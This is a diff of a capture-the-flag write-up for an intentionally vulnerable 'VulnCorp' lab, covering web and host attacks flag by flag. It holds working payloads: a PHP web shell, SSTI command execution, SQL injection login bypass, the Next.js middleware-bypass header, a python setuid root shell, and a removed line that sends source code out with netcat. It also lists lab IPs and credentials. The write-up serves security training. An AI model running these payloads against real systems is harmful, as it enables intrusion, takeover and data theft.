@@ -38,7 +38,12 @@ Date: 2026-06-06
 	- *FLAG{s3c0nd_0rd3r_sql1_d4ng3r0us}*
 10. Tenth flag - RCE
 	- *FLAG{rce_full_pwn_y0u_0wn_th3_b0x}*
-
+11. Eleventh flag - CVE flag
+	- *FLAG{cve_2025_29927_m1ddl3w4r3_byp4ss_pwn3d}*
+12. Twelfth flag - User flag
+	- *FLAG{cve_2025_29927_ssh_l4t3r4l_m0v3}*
+13. Thirteenth flag -ROOT flag
+	- *FLAG{su1d_py3_r00t_3sc4l4t10n_pwn3d}*
 ---
 # Preparation
 ---
@@ -56,6 +61,15 @@ Date: 2026-06-06
 ### SSTI
 ```python
 {{self.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('whoami').read() }}
+```
+### PHP
+```php
+<?php
+if (isset($_GET('cmd'))) {
+  $cmd = $_GET('cmd');
+  echo (system($cmd));
+}
+?>
 ```
 ---
 # Initial investigation/enumeration
@@ -96,24 +110,29 @@ register             (Status: 200) [Size: 1694]
 robots.txt           (Status: 200) [Size: 191]
 upload               (Status: 302) [Size: 199] [--> /login]
 ```
-
+**Port 3000**
+```
+cgi-bin/             (Status: 308) [Size: 8] [--> /cgi-bin]
+dashboard            (Status: 307) [Size: 6] [--> /login]
+internal             (Status: 307) [Size: 6] [--> /login]
+login                (Status: 200) [Size: 17982]
+```
+### Site enumeration
+An it support email was found in the site, this could be important to interacting with the potential mail service on port `3000`.
 **`it-support@vulncorp.internal`**
-`testUser`
-`Tester@testers.eu`
-`TestPass`
 
-## **Vulnerability scanning**
-Application was already made to be intentionally vulnerable.
+%% ## **Vulnerability scanning** %%
 
 ---
-# Exploiting and  Investigation
+# Exploiting and Investigation
 ---
 ## Enumeration
-### First flag
-The first flag is shown when doing passive recon, it can be viewed by either using burp-suite or using `curl` with headers. It is stored in the `X-Debug-Token`.
+### First flag - **Passive Recon**
+![[INSA_CHALLENGE_2026_06_06_Passive_recon_2.png]]
 
-### Second flag
-Enumerating through the site further, and checking the `/robots.txt` endpoint returns the second flag.
+The very first flag is found when inspecting the headers of the website on port **80**. The flag is hidden in the **`X-Debug-Token`** header as `X-Debug-Token: FLAG{p4ss1v3_r3c0n_m3t4d4t4_l34k}`.
+
+### Second flag - **Robots.txt Recon**
 ```
 User-agent: *
 Disallow: /admin
@@ -123,60 +142,172 @@ Disallow: /internal
 # FLAG: FLAG{r3c0n_m4st3r_r0b0ts_txt}
 # Note: removed old /secret-panel route, but /admin-old still exists
 ```
-### Third flag
 
-### Fourth flag
+Enumerating through the site further, and inspecting the **`/robots.txt`** endpoint returns the second flag. Along with the second flag, the `robots.txt` reveals potentially important endpoints.
+
+## Getting into the system
+### Registration
+Attempting to login to the admin account with SQLI though the `/login` endpoint results in a response stating that the admins must login through the **`/admin`** endpoint. However the admin endpoint is forbidden for other users.
+
+Since logging in to the admin account is not an option at the moment, the best option is to register and login with a test user.
+
+**Arbitrary registration credentials** :
+Username : `testUser`
+Email : `Tester@testers.eu`
+Password : `TestPass`
+
+### Third flag
+After registration, the dashboard page informs the user that the profile is stored in **`/api/user/18`** endpoint. Checking the endpoint for other users returns the following:
+**`/api/user/1`** ->
+```json
+{
+  "email":"admin@vulncorp.internal",
+  "id":1,
+  "notes":"Admin account - do not share",
+  "role":"admin",
+  "username":"admin"
+}
+```
+>[!Note]
+>Since the admin account is not accessible yet this only confirms that an admin user exists.
+
+**`/api/user/2`** ->
+```json
+{
+  "email": "alice@vulncorp.com",
+  "id": 2,
+  "notes": "FLAG{1d0r_ch4mp_acc3ss_d3n13d_lol}",
+  "role": "user",
+  "username": "alice"
+}
+```
+
+**`/api/user/3`** ->
+```json
+{
+  "email": "bob@vulncorp.com",
+  "id": 3,
+  "notes": "Nothing special here",
+  "role": "user",
+  "username": "bob"
+}
+```
+**`/api/user/4`** ->
+```json
+{
+  "email": "charlie@vulncorp.com",
+  "id": 4,
+  "notes": "I love CTFs",
+  "role": "user",
+  "username": "charlie"
+}
+```
+
+The second user has third flag `FLAG{1d0r_ch4mp_acc3ss_d3n13d_lol}`. All users all have normal permissions, picking one and using SQLI to login to their account is trivial.
+
+### Fourth flag - **Brocken access control**
+![[Broken access control.png]]
+Before logging in to the `alice` user, there is a document store system that can be exploited to gain access to other users documents. The service uses `/document` endpoint where files are named as `DOC-000`. Changing the URL of a public document from bob reveals the fourth flag.
+
+## Lateral movement
+### Fifth flag - **SQLI Password bypass**
+![[INSA_CHALLENGE_2026_06_06_SQL_Injection.png]]
+After logging in with the user `alice`, the fourth flag is revealed in the dashboard page. Since the user is already approved, the `Feedback` and `Upload` pages are unlocked.
+
+**SQLI Payload** : Username: `alice' --`
+
+## Attempting reverse shell
+### Sixth flag - **File upload**
+![[INSA_CHALLENGE_2026_06_06_WEBSHELL.png]]
+After unlocking the file upload page, intercepting the request and replacing the payload with a `.php` file while keeping the `Content-Type` the same reveals the sixth flag. Although the flag is revealed, the site blocks `.php`.
+
 `http://100.31.117.193/document/DOC-001`
 
+## Privilege escalation
+### Seventh - **Cookie hijacking**
+To gain access to the admin panel, the cookie can be hijacked using the payload prepared earlier with a webhook. The payload returns the following after being loaded.
 ```
 %3DFLAG%7Bx55_st0r3d_c00k13_st0l3n%7D%3B%20session%3D.eJyrVkosKCjKL0tNUbIqKSpN1VEqys9JVbJSSkzJzcxT0lEqLU4tis8EyhpC2HmJuQjpWgC3KBVe.aiQclg.z99ORyMrzQvHwxP6sW5SxZFxc4M
 ```
-```
-.eJyrVkosKCjKL0tNUbIqKSpN1VEqys9JVbJSSkzJzcxT0lEqLU4tis8EyhpC2HmJuQjpWgC3KBVe.aiQesw.v940yot8dHBt2ET2ITiUQbhQUUQ
-```
-```
-.eJyrVkosKCjKL0tNUbIqKSpN1VEqys9JVbJSKi1OLVLSUSouzMmMT8tJTAcKufk4ulcDBQzjTUpLMuKTKgtMiovjC8rzjFNqgUpBOuIzgeYYQdh5ibkggxJzMpNTlWoBjbckMA.aiQcLw.MJ-3wHP9jf-n0hAIRU2iz4RPGQc
-```
-
-`Welcome Admin`
-
+Decoded:
 ```
 admin_session=FLAG{x55_st0r3d_c00k13_st0l3n}; session=.eJyrVkosKCjKL0tNUbIqKSpN1VEqys9JVbJSSkzJzcxT0lEqLU4tis8EyhpC2HmJuQjpWgC3KBVe.aiQgHA.i6hK5xWe0vvHpqmkOfgAtWKkaXQ
 ```
-
+Inside is the cookie:
 ```
-POST /upload HTTP/1.1
-Host: 100.31.117.193
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Content-Type: multipart/form-data; boundary=----geckoformboundarycc73c8749132de51856e7bbf0868da07
-Content-Length: 15462
-Origin: http://100.31.117.193
-Connection: keep-alive
-Referer: http://100.31.117.193/upload
-Cookie: session=.eJyrVkosKCjKL0tNUbIqKSpN1VEqys9JVbJSKi1OLVLSUSouzMmMT8tJTAcKufk4ulcDBQzjTUpLMuKTKgtMiovjC8rzjFNqgUpBOuIzgeYYQdh5ibkggxJzMpNTlWoBjbckMA.aiQcLw.MJ-3wHP9jf-n0hAIRU2iz4RPGQc
-Upgrade-Insecure-Requests: 1
-Priority: u=0, i
-
-------geckoformboundarycc73c8749132de51856e7bbf0868da07
-Content-Disposition: form-data; name="file"; filename="ADWA-FLAG-IMG.jpg"
-Content-Type: image/jpeg
-
-<?php
-
-?>
-
-------geckoformboundarycc73c8749132de51856e7bbf0868da07--
+.eJyrVkosKCjKL0tNUbIqKSpN1VEqys9JVbJSSkzJzcxT0lEqLU4tis8EyhpC2HmJuQjpWgC3KBVe.aiQesw.v940yot8dHBt2ET2ITiUQbhQUUQ
 ```
+Along with the flag: **`FLAG{x55_st0r3d_c00k13_st0l3n}`**
 
-```
+### Eighth flag - **SSTI injection**
+![[INSA_CHALLENGE_2026_06_06_SSTI_FLAG.png]]
+The eighth flag was found in the admin profile page. Updating it with a payload in the greeting input, reveals that the server is running as **`root`**.
+```python
 {{ cycler.__init__.__globals__.os.popen('whoami').read() }}
 ```
-`ssti_flag.txt`
-**`FLAG{5st1_t3mpl4t3_1nj3ct10n_rce}`**
-`{{ cycler.__init__.__globals__.os.popen('cat app.py').read() }}`
+Enumerating through the server files reveals a `ssti_flag.txt` file in `/flags` which contains the flag : **`FLAG{5st1_t3mpl4t3_1nj3ct10n_rce}`**.
+
+The flag can also be revealed with the payload:
 ```python
-{{ cycler.__init__.__globals__.os.popen('tar -czf - app.py | nc 10.0.2.15 1234').read() }}
+{% include 'ssti_flag.txt' %}
 ```
+
+## ...
+### Ninth flag - **Second order SQLI**
+...
+
+### Tenth flag - **RCE**
+...
+
+## HR Portal
+### Eleventh flag - **NEXT.JS CVE FLAG**
+The **NMAP** enumeration showed that port **3000** was open. NMAP guessed that the port was being used for `ppp`. This assumption is not correct however, as using `http` returns the HR portal.
+![[HR_PORTAL.png]]
+
+Checking the server status returns a JSON response with information about the server. It is running an old version of `Next.js` (version **14.1.0**).
+**`http://100.31.117.193:3000/api/health`** ->
+```json
+{
+  "status": "ok",
+  "service": "VulnCorp HR Portal",
+  "version": "3.2.1",
+  "framework": "Next.js 14.1.0",
+  "node": "v20.20.2",
+  "uptime": 0.895019568,
+  "timestamp": "2026-06-06T08:56:20.165Z"
+}
+```
+
+The trying to navigate the site is almost impossible without logging in with the correct credentials. This is due to the site using `Next.js` middleware. Since it is running an old version of next, the middleware can be bypassed by using the **`CVE-2025-29927`** middleware bypass.
+
+By adding an extra header after intercepting the request to a restricted page.
+```
+x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
+```
+
+Trying to visit a page after modifying the request and bypassing the login page shows the flag.
+![[CVE_FLAG.png]]
+
+**Source** : 
+- [Next JS middleware authorization bypass (projectdiscovery.io)](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass)
+
+### Twelfth flag - **USER FLAG**
+The payroll page has a note with a comment:
+```
+Note: SSH key for payroll server at `/home/hr-admin/.ssh/id_rsa`
+// Change the Password to access the HR Portal Server (34.239.170.92) as it is left as default "HRportal2024!"
+```
+This makes it possible to `ssh` into the server(`34.239.170.92`) with the user `hr-admin` and the password `HRportal2024!`.
+
+## Privilege escalation
+### Thirteenth flag - **USER FLAG**
+![[ROOT_FLAG.png]]
+Using a common shell payload doesn't return a root shell.
+```bash
+python -c 'import os; os.execl("/bin/sh", "sh")'
+```
+However, changing the `SUID` in the payload, returns a root shell.
+```bash
+python3 -c 'import os; os.setuid(0) ;os.execl("/bin/sh", "sh")'
+```
+Running **`cd /root && cat root.txt`** returns the Flag.
